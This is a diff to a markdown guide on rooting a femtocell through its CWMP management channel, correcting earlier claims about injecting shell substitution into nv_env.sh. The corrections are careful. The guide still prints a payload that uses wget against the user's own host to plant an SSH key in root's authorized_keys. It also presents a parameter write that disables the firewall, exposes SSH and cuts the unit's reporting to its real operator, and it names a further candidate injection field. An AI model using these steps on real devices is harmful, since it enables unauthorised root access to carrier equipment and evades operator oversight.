@@ -183,16 +183,75 @@ where AT&T stood. ⇒ **Phase 2 is what converts a session into a shell.**
 
 ---
 
-## Phase 2 — ⭐⭐ The lever: `X_00000C_LogUpload.Tuning`, which writes straight into `nv_env.sh`
+## Phase 2 — `X_00000C_LogUpload.Tuning`: the right FIELD, and an UNPROVEN second half
 
-> ### 🔴 **THIS PAGE HAS NAMED THE WRONG ROUTE THREE TIMES. THE TRAIL IS KEPT BECAUSE EACH WRONG VERSION IS ONE SOMEONE ELSE WILL REACH FOR.**
+> ### 🔴🔴 **CORRECTED 2026-09-17 — `ENV_XKINIT` IS NOT A REAL KEY. THE DEVICE REJECTS IT, AND THAT WAS THE MOST QUOTABLE LINE ON THIS PAGE.**
+> `[measured from the device's OWN response, 2026-09-11T15:55:21, in the ACS body log on the core.]`
+> ```
+> soap:Fault 9003 Invalid arguments
+>   SetParameterValuesFault -> Device.X_00000C_LogUpload.Tuning
+>   9007 "Invalid parameter value: The invalid value is 'ENV_XKINIT: $(grep -q dph151-jp ...'"
+> ```
+> ⇒ ⛔ **THE FIRMWARE VALIDATES KEY NAMES.** `ENV_XKINIT` was **invented by this project**, and the
+> page's claim that *"the NAME is arbitrary — nothing consumes `ENV_XKINIT`"* is **exactly backwards**:
+> nothing consumes it **because the device will not store it.**
+> ### ✅ **THE SIX KEYS THE DEVICE ACTUALLY ACCEPTS** `[its own GetParameterValuesResponse, same session]`
+> ```
+> ENV_FIREWALL_DISABLED        TRUE      <- already TRUE ⇒ AN EARLIER Tuning SPV SUCCEEDED
+> ENV_VERBOSE_CONSOLE_ENABLED  TRUE      <- also already set
+> ENV_BASICOAM_DISABLED        TRUE
+> ENV_SERIAL_CONSOLE_ENABLED   FALSE
+> ENV_CRASH_REPORT_URL         (empty)   <- ★ the only URL-shaped field. The plausible escape sink.
+> ENV_DIAG_FILE_LIST           /var/ipaccess/.tamperInfo .../nv_env.sh ...
+> ```
+> ⭐⭐ **THOSE TWO `TRUE`s ARE THE STRONGEST RESULT ON THIS PAGE AND THEY ARE NOT THE ONE IT CLAIMED.**
+> **They are not defaults — something set them.** ⇒ **A `Tuning` SPV IS ACCEPTED AND IS STORED.**
+> **That half is PROVEN. The half that carries the page — that a stored value reaches `nv_env.sh`
+> and that `$( )` ever executes — IS NOT.**
+
+> ### ⛔ **AND ON THE 579.11.127 TRAIN THE DOCUMENTED CHAIN DOES NOT RESOLVE AT ALL**
+> `[lucid-fsvariant, read-only on a NAND dump of train 579.11.127, with controls stated below.]`
+> ```
+>                 setnv   nv_env   CONTROL '/opt'
+> DslmSsp           0       0          8      <- CONTROL PASSES ⇒ THE ZERO IS A MEASUREMENT
+> swdl_client       1       6          9      <- the sink's ACTUAL caller
+> cmhs              0       0          0      <- ⚠️ CONTROL FAILS ⇒ these zeros are INADMISSIBLE
+> sysctrlUpdateEnvVar:  0 files in the ENTIRE rootfs
+> ```
+> ⇒ 🔴 **`Tuning` → `DslmSsp` → `sysctrlUpdateEnvVar` → `setnv_env.sh` HAS NO `DslmSsp` HALF on this
+> train.** ⚠️ **It may be a 579.11.144 property** — this page was written against a unit running .144.
+> ⛔ **BOUND, CARRIED VERBATIM FROM ITS AUTHOR:** *"a binary can call a script through a CONSTRUCTED
+> string, so 'the literal is absent' is NOT 'it cannot call it.'"* **What makes the zero admissible
+> is not the grep** — it is the complete command surface (35 strings, all printed), every path
+> fragment against a `swdl_client` control reading non-zero on all of them, and all 7 path-shaped
+> `%s` formats, **none of which builds under `/opt` or `/var`.**
+> ⚠️ **DEVICE-ATTRIBUTION BOUND:** the dump is a **THIRD DEVICE** on that train — its
+> `hw_description.dat` serial matches neither unit discussed on this page. **Its results reach a
+> `579.11.127` unit by TRAIN EQUALITY, which is an inference, not the byte-for-byte identity an
+> earlier write-up claimed.**
+
+> ### ✅ **WHAT IS STILL TRUE, AND IT IS THE HALF WORTH KEEPING: THE SINK IS REAL**
+> ```
+> /etc/profile:66-70   NVENV=/var/ipaccess/nv_env.sh ; if [ -f $NVENV ]; then source $NVENV; fi
+> setnv_env.sh:46      echo "export $1=\"$2\"" >> $NVENV      ⭐ NO ESCAPING. $2 GOES IN VERBATIM.
+> ```
+> ⇒ **A value carrying `$( )` that reaches that file IS executed as root at the next login.** ⛔ **The
+> unproven link is everything UPSTREAM of it: what puts an attacker-chosen string into that file.**
+> ⭐ **`swdl_client` is the one binary that reaches the sink** — so on this train the road to
+> `nv_env` looks like the **software-download** path, not the CWMP parameter. ⚠️ **Which needs a
+> management session to trigger, and CWMP is the dead channel.**
+
+> ### 📕 **THE SUPERSEDED ROUTE-NAMING TRAIL, KEPT BECAUSE EACH WRONG VERSION IS ONE SOMEONE WILL REACH FOR**
 > ```
 > v1  "serve a firmware image; FS_VARIANT unhardens it"   NEVER DONE -- and it rewrites both U-Boot banks
 > v2  "rewrite ManagementServer.URL to point at you"      wrong mechanism: a pointer, not an injection
 > v3  "crlServerBaseUrl (2203)"                           RIGHT SINK, WRONG FIELD -- that is the 151's
 >                                                          DMI attribute. The 154 has no DMI console.
-> ✅  X_00000C_LogUpload.Tuning, over CWMP                 <- the field. JP called it "the serverurlpath thingy".
+> v4  "Tuning + ENV_XKINIT, over CWMP"                    RIGHT FIELD, REJECTED KEY -- fault 9003/9007
 > ```
+> ⭐⭐ **v1 has since come back as a MEASURED route and is no longer merely wrong** — see the
+> dev-letter branch under the full-image section at the end of this page. **It is still the
+> irreversible one, and still JP's decision rather than a lane's.**
 
 **The device dials OUT to your ACS.** ⭐⭐⭐ **That single fact is why this route works on a 154 and
 nothing else does:** the session is an **ESTABLISHED flow**, so the 154's wholesale inbound REJECT —
@@ -201,42 +260,62 @@ the thing that closes every other door — **is irrelevant to it.**
 ### 🔧 **THE CHAIN, EACH LINK NAMED**
 
 ```
-device DIALS OUT (CWMP)
-  ACS answers with SetParameterValues on   Device.X_00000C_LogUpload.Tuning
-     -> DslmSsp
-     -> sysctrlUpdateEnvVar
-     -> setnv_env.sh:46      echo "export $1=\"$2\"" >> nv_env.sh     ⭐ NO ESCAPING. THE WHOLE BUG.
-  => /var/ipaccess/nv_env.sh gains:    export ENV_XKINIT="$(<command>)"
-  => the next time ANY of its 22 ROOT CONSUMERS sources that file, the $( ) RUNS AS ROOT
+device DIALS OUT (CWMP)                                              ✅ PROVEN
+  ACS answers with SetParameterValues on Device.X_00000C_LogUpload.Tuning
+     -> the device ACCEPTS and STORES the value                      ✅ PROVEN
+        (two NV flags read TRUE that are not defaults)
+     -> ??? ------------------------------------------------------- 🔴 NOT ESTABLISHED
+        `DslmSsp` -> `sysctrlUpdateEnvVar` was the documented link.
+        `sysctrlUpdateEnvVar` DOES NOT EXIST on the 579.11.127 train,
+        and `DslmSsp` reaches neither `setnv_env` nor `nv_env`
+        (control passing). `swdl_client` is the only binary that does.
+     -> setnv_env.sh:46   echo "export $1=\"$2\"" >> nv_env.sh       ✅ SINK IS REAL, UNESCAPED
+  => the next time ANY root consumer sources that file, a $( ) in it RUNS AS ROOT   ✅ MECHANISM REAL
 ```
+⇒ ⭐⭐⭐ **THE MIDDLE ARROW IS THE WHOLE QUESTION, AND THIS PAGE USED TO DRAW IT SOLID.** Both ends
+are measured; **nothing measured joins them.** ⛔ **A chain diagram is the single most quotable
+artefact in a guide, and every link in it reads as equally established.** ⇒ **Mark the unproven
+link INSIDE the diagram, never in a note beneath it.**
 
 > ### 🎯 **AND `/etc/profile:69` SOURCES IT — SO A LOGIN IS ENOUGH**
 > **No reboot. No service restart.** ⭐ **Compare the 151, where the equivalent needs TWO reboots** —
 > the subshell cannot change the parent environment, so the flag must be written to the file and the
 > box booted again. **Here, anything that opens a shell fires it.**
 
-### 🎯 **THE ACTUAL WRITE, AS IT WAS SENT — FOUR VARIABLES IN ONE SPV**
+### 🎯 **THE WRITE THAT WORKS — AND IT IS THE THREE FLAGS, NOT AN INJECTION**
 
+**Send only keys the firmware accepts.** These three are measured as accepted and stored:
 ```
 Device.X_00000C_LogUpload.Tuning  =
-  "ENV_XKINIT: $(mkdir -p /var/ipaccess/root_home/.ssh && wget -q -O- http://<you>:8081/k
-                 >>/var/ipaccess/root_home/.ssh/authorized_keys);
-   ENV_FIREWALL_DISABLED:        TRUE;
+  "ENV_FIREWALL_DISABLED:        TRUE;
    ENV_VERBOSE_CONSOLE_ENABLED:  TRUE;
    ENV_BASICOAM_DISABLED:        TRUE;"
 ```
-⇒ ⭐⭐⭐ **THIS is why `Tuning` and not a URL-shaped attribute: you choose the variable NAMES, so the
-injection AND the three flags that make it useful land in a SINGLE write.**
 ```
-ENV_XKINIT                    the injection. The $( ) runs as root when nv_env.sh is sourced.
-                              ⭐ the NAME is arbitrary — nothing consumes ENV_XKINIT. It exists
-                                 only to carry the substitution.
 ENV_FIREWALL_DISABLED  TRUE   so you can reach the port afterwards
 ENV_VERBOSE_CONSOLE_…  TRUE   so dropbear binds 0.0.0.0:22 instead of loopback
 ENV_BASICOAM_DISABLED  TRUE   ⬅ stops the unit's Basic-OAM channel phoning its real operator
 ```
-⚠️ **The payload pulls the key from your own HTTP server (`:8081` here) rather than embedding it** —
-**one less quoting layer inside a string that is already being interpolated into a shell file.**
+⇒ ✅ **That is a real, useful configuration win and it needs no injection at all.** ⚠️ **It does
+not by itself give you a shell** — it opens the path to one you obtain another way.
+
+> ### 📕 **SUPERSEDED, KEPT VERBATIM — THE PAYLOAD AS THIS PAGE USED TO GIVE IT. IT IS REJECTED.**
+> ```
+> ~~Device.X_00000C_LogUpload.Tuning =~~
+> ~~  "ENV_XKINIT: $(mkdir -p /var/ipaccess/root_home/.ssh && wget -q -O- http://<you>:8081/k~~
+> ~~                 >>/var/ipaccess/root_home/.ssh/authorized_keys); ..."~~
+> ~~⇒ "the NAME is arbitrary — nothing consumes ENV_XKINIT"~~
+> ```
+> 🔴 **`soap:Fault 9003 / 9007 Invalid parameter value`. The device names `ENV_XKINIT` in its own
+> rejection.** ⇒ **Anyone who copies the struck block gets a fault and no shell.**
+> ⭐⭐ **AND THE SENTENCE THAT MADE IT LOOK SAFE IS THE ONE THAT WAS WRONG.** *"The name is
+> arbitrary"* was offered as reassurance — a throwaway clause, the kind nobody re-checks — and it
+> was the **load-bearing false premise of the whole route.** ⇒ ***The claim most worth verifying is
+> the one presented as too obvious to need it.***
+> ⚠️ **A URL-shaped field survives as the remaining candidate sink: `ENV_CRASH_REPORT_URL` is
+> accepted, is currently empty, and is the only one of the six that takes a URL.** ⛔ **Nobody has
+> tested whether a `$( )` in it reaches `nv_env.sh` — and the chain above says the upstream half is
+> missing on at least one train. UNMEASURED. Do not price it as a route.**
 
 > ### ⛔⛔ **`Tuning` IS A WHOLE-STRING REPLACE, AND THE REAL WRITE HAD TO CARRY SIX PRE-EXISTING KEYS**
 > **The device's live `Tuning` value already held keys. Sending only your own would have DELETED
@@ -261,6 +340,23 @@ ENV_DIAG_FILE_LIST: /var/ipaccess/.tamperInfo /var/ipaccess/nv_env.sh …
 > omission; a STALE key looks like diligence — present, correctly spelled, and wrong.**
 
 > ### ⛔⛔ **THE HONEST STATE OF THE ESCAPE — AND THE PAYLOAD IS IN THE TOOL, DATED AND ATTRIBUTED**
+> ### 🔴 **READ THE PHASE 2 BANNER FIRST: THE KEY IN THE PAYLOAD BELOW IS ONE THE DEVICE REJECTS.**
+> **The ✅ on *"the payload EXISTS"* means it exists IN THE TOOL — not that it worked.** ⭐ **A green
+> check on a true statement, sitting one line above a payload, is read as a green check on the
+> payload.**
+> ### ⚠️ **AND A TENSION THIS PAGE MUST NOT RESOLVE BY PICKING A SIDE**
+> ```
+> JP, who ran it   "we were able to get into the 154 that way"      <- TESTIMONY
+> the device       fault 9003/9007, naming ENV_XKINIT in its own    <- MEASUREMENT
+>                  rejection; 0 of 663 readbacks contained the key
+> ```
+> ⇒ **Both are in this corpus and they do not agree.** ⛔ **Recorded, NOT adjudicated.** The
+> possibilities include different moments, different units, a different key name on the successful
+> attempt, or a route in by something other than this field. **Nobody has established which.**
+> ⭐⭐ **This corpus's own rule applies and is the reason the page does not simply believe the
+> operator: *testimony from the person holding the hardware has no evidence class here.*** ⚠️ **That
+> cuts BOTH ways — it does not make the testimony false, it makes it unciteable as proof.** ✅ **What
+> would settle it: the SPV body and the fault-or-success for the attempt JP is remembering.**
 > ```
 > ✅ the payload EXISTS, queued through this exact field, with its authorisation recorded in code:
 >       Tuning <- "ENV_XKINIT: $(mkdir -p /var/ipaccess/root_home/.ssh && <key install>)"
@@ -273,8 +369,20 @@ ENV_DIAG_FILE_LIST: /var/ipaccess/.tamperInfo /var/ipaccess/nv_env.sh …
 > authorised.** ⛔ **What is NOT settled is whether that particular queued write ever executed** —
 > the readback evidence says that one did not. ⚠️ **Recorded, not adjudicated: the likeliest reading
 > is different moments on different units, and nobody has established it.**
-> ✅ **Beyond doubt either way: the `Tuning` write lands, the NV variables it sets take effect, and
-> the field reaches `setnv_env.sh` unescaped.**
+> ### 🔴 **CORRECTED 2026-09-17 — THE "BEYOND DOUBT" LINE BELOW WAS WRONG IN ITS THIRD CLAUSE.**
+> ~~*"Beyond doubt either way: the `Tuning` write lands, the NV variables it sets take effect, and
+> the field reaches `setnv_env.sh` unescaped."*~~
+> ```
+> "the Tuning write lands"                    ✅ STANDS — measured, an SPV was accepted and stored
+> "the NV variables it sets take effect"      ✅ STANDS — two flags read TRUE that are not defaults
+> "the field reaches setnv_env.sh unescaped"  🔴 NOT ESTABLISHED — this is the missing middle arrow
+> ```
+> ⇒ ☠️ **Two measured clauses and one unmeasured one, joined by "and" under the words "beyond
+> doubt".** ⭐⭐ ***A conjunction inherits the confidence of its strongest member.*** The two true
+> clauses were doing the persuasive work for the third, and the phrase "beyond doubt either way"
+> made the whole sentence unre-checkable — **it reads as the place where the hedging STOPS.**
+> ⚠️ **`setnv_env.sh` IS unescaped — that part is measured and kept above.** What is missing is any
+> demonstrated path from the `Tuning` field TO `setnv_env.sh`.
 
 > ### ✅ **THE PRECONDITION IS MEASURED, AND IT IS WHY THIS SUITS A 154 AND NOT A 151**
 > ```
@@ -307,9 +415,16 @@ Route 6.** ⭐ **On a 154 the ACS is the console.**
 crlServerBaseUrl (2203, ac=1 WRITABLE)  ->  export ENV_CRL_BASE_SERVER="<your value>"
 ```
 ⇒ **Also unescaped, so it also injects.** ⛔ **But it writes ONE FIXED VARIABLE: you inject into the
-VALUE of a variable you did not choose.** ⭐ **`Tuning` takes `NAME: value; NAME: value` — you
-choose the variable NAME, which is why `ENV_XKINIT`, `ENV_FIREWALL_DISABLED` and
-`ENV_VERBOSE_CONSOLE_ENABLED` can all come from a single write.**
+VALUE of a variable you did not choose.** ⭐ **`Tuning` takes `NAME: value; NAME: value`, so several
+keys land in a single write** — `ENV_FIREWALL_DISABLED` and `ENV_VERBOSE_CONSOLE_ENABLED` together.
+> ### 🔴 **CORRECTED 2026-09-17 — "YOU CHOOSE THE VARIABLE NAME" IS FALSE ON THE 154.**
+> ~~*"you choose the variable NAME, which is why `ENV_XKINIT` … can all come from a single write"*~~
+> **The firmware validates key names and rejects anything outside its six** (fault 9003/9007 — see
+> the Phase 2 banner). ⇒ ⛔ **The advantage `Tuning` was said to have over `crlServerBaseUrl` — a
+> free choice of variable name — DOES NOT EXIST.** **Both fields let you control a VALUE only.**
+> ⭐⭐ **And that inverts the comparison this section was written to make:** `Tuning`'s edge over the
+> 2203 door is now **breadth (several known keys at once), not arbitrary naming.** ⚠️ **`2203` is a
+> nano3G DMI attribute and a 154 has no DMI console, so the comparison stays hypothetical here.**
 > ### ☠️ **AND IF YOU GO LOOKING FOR `2203`, THE ATTRIBUTE MAPS IN CIRCULATION DISAGREE BY ONE ROW**
 > ```
 > the STALE map       2201 crlServerBaseUrl  ·  2203 crls
